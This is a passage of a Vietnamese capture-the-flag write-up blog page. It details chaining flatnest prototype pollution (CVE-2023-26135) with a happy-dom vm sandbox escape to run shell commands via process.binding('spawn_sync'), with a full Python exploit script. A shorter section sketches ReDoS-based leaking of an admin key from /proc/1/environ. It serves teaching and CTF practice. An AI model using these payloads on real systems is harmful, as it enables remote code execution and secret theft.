+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJFMR4_IZg.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rydEC4OUWx.png"></p>
+<h2 id="phân-tích-1">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích-1">#</a></h2>
+<ul>
+<li>Flag được ghi vào một file có tên <code>/flag_xxxxx.txt</code> (nằm ở root <code>/</code>)</li>
+<li>biến môi trường <code>$FLAG</code> bị unset -&gt; RCE để list file trong <code>/</code> và đọc</li>
+</ul>
+<h3 id="appjs">app.js<a hidden class="anchor" aria-hidden="true" href="#appjs">#</a></h3>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HyCx1H_8-e.png"></p>
+<ul>
+<li>Sử dụng <code>express</code> và <code>happy-dom</code></li>
+<li>endpoint <code>/config</code> (POST)
+<ul>
+<li>Nhận JSON input</li>
+<li>sử dụng thư viện <code>flatnest</code> hàm <code>nest()</code> để xử lý object đầu vào</li>
+</ul>
+</li>
+<li>endpoint <code>/render</code> (POST)
+<ul>
+<li>nhận <code>html</code> string</li>
+<li>khởi tạo <code>new Window()</code> từ <code>happy-dom</code></li>
+<li>ghi HTML vào document và trả về <code>outerHTML</code>
+=&gt; Nơi ta execute XSS/JS nhưng mặc định <code>happy-dom</code> sẽ tắt execute JS</li>
+</ul>
+</li>
+</ul>
+<h2 id="vuln-1">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln-1">#</a></h2>
+<p><strong>1. prototype pollution trong flasnest (CVE-2023-26135)</strong></p>
+<ul>
+<li><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Hkx1lBuLWe.png"></li>
+<li>Thư viện <code>flatnest</code> (v1.0.1) unflatten một object (chuyển key dạng dot-notation <code>x.y</code> thành nested object <code>{x: {y: ...}}</code>)</li>
+<li>Nhưng nó không lọc các key như <code>__proto</code>, <code>constructor</code>, <code>prototype</code></li>
+<li>Các payload kiểu cũ <code>{&quot;__proto__&quot;: {&quot;settings&quot;: ...}}</code> -&gt; fail vì <code>flatnest</code> sẽ lọc key này</li>
+<li><code>flatnest</code> có một tính năng đặc biệt để hỗ trợ Circular References -&gt; cho phép định nghĩa một chuỗi đặc biệt để trỏ ngược lại object cha
+(<a href="https://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js">có tham tham khảo ở đây</a>)</li>
+<li><code>flatnest</code> parse chuỗi có định dạng <code>[Circular (path)]</code></li>
+<li>nó không validate <code>path</code> bên trong <code>Circular</code></li>
+<li>khi ta gửi <code>&quot;[Circular (__proto__)]&quot;</code> <code>flatnest</code> sẽ phân giải nó và trỏ thẳng vào <code>Object.prototype</code> của object hiện tại mà không bị filter key chặn
+<strong>2. sandbox escapse/RCE trong happy-dom</strong></li>
+<li>khi <code>enableJavaScriptEvaluation</code> được bật -&gt; tag <code>script</code> trong HTML gửi lên sẽ được execute</li>
+<li>Vì chạy trong cùng context với note process nên ta có thể dùng <code>this.constructor.constructor</code> để lấy <code>Function</code> constructor gốc -&gt; gọi ra <code>process</code> của nodejs và rce</li>
+</ul>
+<h2 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h2>
+<h3 id="prototype-pollution">prototype pollution<a hidden class="anchor" aria-hidden="true" href="#prototype-pollution">#</a></h3>
+<ul>
+<li>Dùng <code>nest()</code> tại <code>/config</code> để pollution <code>Object.prototype.settings</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;polluter&#34;</span>: <span style="color:#e6db74">&#34;[Circular (__proto__)]&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;polluter.settings&#34;</span>: {},
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;polluter.settings.enableJavaScriptEvaluation&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><code>flatnest</code> gán <code>obj.polluter = obj.__proto__</code> (tức là <code>Object.prototype</code>)</li>
+<li>Nó gán <code>obj.polluter.settings.enableJavaScriptEvaluation = true</code>
+&lt;=&gt; <code>Object.prototype.settings = { enableJavaScriptEvaluation: true }</code></li>
+</ul>
+<h3 id="rce">RCE<a hidden class="anchor" aria-hidden="true" href="#rce">#</a></h3>
+<h4 id="sandbox-escapse">sandbox escapse<a hidden class="anchor" aria-hidden="true" href="#sandbox-escapse">#</a></h4>
+<ul>
+<li>sau khi pollute và trả về <code>{ message: 'configuration applied' }</code></li>
+<li><code>happy-dom</code> sử dụng <code>vm</code> module của node.js để chạy script trong tag <code>&lt;script&gt;</code></li>
+<li><code>vm</code> không phải là security sandbox. Context bên trong <code>vm</code> vẫn có thể truy cập vào constructor của các object cơ bản ( <code>Object</code>, <code>Function</code>)</li>
+<li>ta dùng <code>this.constructor.constructor</code> (trong đó <code>this</code> là window/global scope của VM) sẽ trả về <code>Function</code> constructor của host process (node.js chính) cho phép ta thoát khỏi VM context và execute code</li>
+</ul>
+<h4 id="internal-binding">internal binding<a hidden class="anchor" aria-hidden="true" href="#internal-binding">#</a></h4>
+<ul>
+<li><code>process.binding('spawn_sync')</code> là internal API của node.js được dùng bởi <code>child_process</code>. Dùng cái này để bypass nếu module <code>child_process</code> bị override hoặc filter, và nó khá ổn để spawn process con (như <code>/bin/ls</code> hay <code>/bin/cat</code>) trực tiếp</li>
+</ul>
+<pre tabindex="0"><code class="language-javascript!" data-lang="javascript!">// thoát sandbox, lấy object process của node.js
+const process = this.constructor.constructor(&#34;return process&#34;)();
+
+// lấy internal binding để spawn process
+const spawn = process.binding(&#34;spawn_sync&#34;);
+
+// Cấu hình lệnh
+const opts = {
+    file: &#34;/bin/ls&#34;,
+    args: [&#34;ls&#34;, &#34;/&#34;],
+    envPairs: [],
+    stdio: [
+        {type:&#34;pipe&#34;,readable:true,writable:false},
+        {type:&#34;pipe&#34;,readable:false,writable:true},
+        {type:&#34;pipe&#34;,readable:false,writable:true}
+    ]
+};
+
+// excecute và lấy output
+const result = spawn.spawn(opts);
+
+// trả kết quả về client bằng cách ghi đè document body
+document.body.innerHTML = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
+</code></pre><ul>
+<li>
+<p>Sử dụng lệnh <code>ls /</code> để xem tên file flag_*.txt
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkaRYhOIWl.png"></p>
+</li>
+<li>
+<p>Sau khi tìm được tên flag flag thì thay phần cấu hình thành lệnh cat:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">file</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/bin/cat&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">args</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#34;cat&#34;</span>, <span style="color:#e6db74">&#34;/flag_510a85c2731f7e49.txt&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">envPairs</span><span style="color:#f92672">:</span> [],
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stdio</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>        {<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#a6e22e">readable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">true</span>,<span style="color:#a6e22e">writable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#a6e22e">readable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>,<span style="color:#a6e22e">writable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">true</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#a6e22e">readable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>,<span style="color:#a6e22e">writable</span><span style="color:#f92672">:</span><span style="color:#66d9ef">true</span>}
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HyJI92O8-g.png"></p>
+<h2 id="full-script-exploit">Full script exploit<a hidden class="anchor" aria-hidden="true" href="#full-script-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target config</span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://challenges2.ctf.sd:35309&#34;</span> <span style="color:#75715e"># Đổi IP nếu cần</span>
+</span></span><span style="display:flex;"><span>CMD_TO_RUN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /flag_*.txt&#34;</span> <span style="color:#75715e"># Lệnh cần chạy để lấy flag</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Session để giữ kết nối tốt hơn</span>
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Step 1: Performing Prototype Pollution on flatnest...&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload abuse tính năng Circular Reference của flatnest</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># polluter -&gt; Object.prototype</span>
+</span></span><span style="display:flex;"><span>    pollution_payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;polluter&#34;</span>: <span style="color:#e6db74">&#34;[Circular (__proto__)]&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;polluter.settings&#34;</span>: {},
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;polluter.settings.enableJavaScriptEvaluation&#34;</span>: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r1 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/config&#34;</span>,
+</span></span><span style="display:flex;"><span>            json<span style="color:#f92672">=</span>pollution_payload,
+</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>}
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Pollution Response: </span><span style="color:#e6db74">{</span>r1<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error sending pollution: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Step 2: Triggering RCE via Happy DOM...&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload Javascript độc hại để escape sandbox và chạy lệnh hệ thống</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dùng process.binding(&#39;spawn_sync&#39;) để chạy lệnh shell</span>
+</span></span><span style="display:flex;"><span>    js_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    try </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const process = this.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const spawn = process.binding(&#34;spawn_sync&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // Cấu trúc options cho spawn_sync binding
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const opts = </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            file: &#39;/bin/sh&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            args: [&#39;sh&#39;, &#39;-c&#39;, &#39;</span><span style="color:#e6db74">{</span>CMD_TO_RUN<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            envPairs: [],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            stdio: [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">type:&#39;pipe&#39;,readable:true,writable:false</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">type:&#39;pipe&#39;,readable:false,writable:true</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">type:&#39;pipe&#39;,readable:false,writable:true</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const result = spawn.spawn(opts);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // result.output[1] là stdout (buffer)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const output = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const error = String.fromCharCode.apply(null, new Uint8Array(result.output[2]));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.body.innerHTML = output + error;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74"> catch(e) </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.body.innerHTML = e.toString();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    render_payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;html&#34;</span>: js_payload
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r2 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/render&#34;</span>,
+</span></span><span style="display:flex;"><span>            json<span style="color:#f92672">=</span>render_payload,
+</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>}
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[FLAG] Output retrieved:&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(r2<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error triggering RCE: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    exploit()
+</span></span></code></pre></div><h1 id="0xclinic">0xClinic<a hidden class="anchor" aria-hidden="true" href="#0xclinic">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyFinLdIZe.png"></p>
+<h2 id="overview-2">Overview<a hidden class="anchor" aria-hidden="true" href="#overview-2">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJeVcYO8Wl.png"></p>
+<ul>
+<li>Reg không có quyền cao và cũng không thể làm gì hơn</li>
+</ul>
+<h2 id="exploit-3">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-3">#</a></h2>
+<ul>
+<li>
+<p>Passwd được lấy bằng national_id</p>
+</li>
+<li>
+<p>Đầu tiên sẽ đi vào <code>/api/profile/patient_test</code> muốn biết được path này thì cần có kĩ năng fuzzing , và lấy được các thông tin như sau:
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy077yK8Zl.png"></p>
+</li>
+<li>
+<p>Dựa vào thông tin này ta có thể tìm ra được <code>national_id</code> cũng như <code>passwd</code> của user : <code>patient_test</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1mu7JFI-l.png"></p>
+</li>
+<li>
+<p>Auke lấy được account có xác thực : <code>patient_test</code> : <code>30508011601589</code></p>
+</li>
+<li>
+<p>Như vậy ta đã chạm để đến các enpoint private của hệ thống</p>
+</li>
+<li>
+<p>Ta sẽ lấy <code>ADMIN_KEY</code> ở file <code>proc/1/environ</code> bằng việc ReDos ; nếu thời gian delay thì kí tự ở vị trí đó là chính xác ; cứ thế ta sẽ lấy được chuỗi <code>ADMIN_KEY</code> ; path traversal chuyển về file <code>environ</code> để tìm kiếm thay vì chức năng mặc định là tìm kiếm ở file có tên được lấy với <code>username</code> người dùng
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJ58LyKIbe.png"></p>
+</li>
+<li>
+<p>Sau khi có được <code>ADMIN_KEY</code> ta mới có thể upload được file trên <code>/api/health</code> để rồi xss &hellip;&hellip;
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy1TDkFIWg.png"></p>
+</li>
+</ul>
+<p>=================================================================</p>
+<p>ĐƯỢC VIẾT LẠI BỞI : <strong>p1c0L0</strong> AND <strong>TIWZA</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
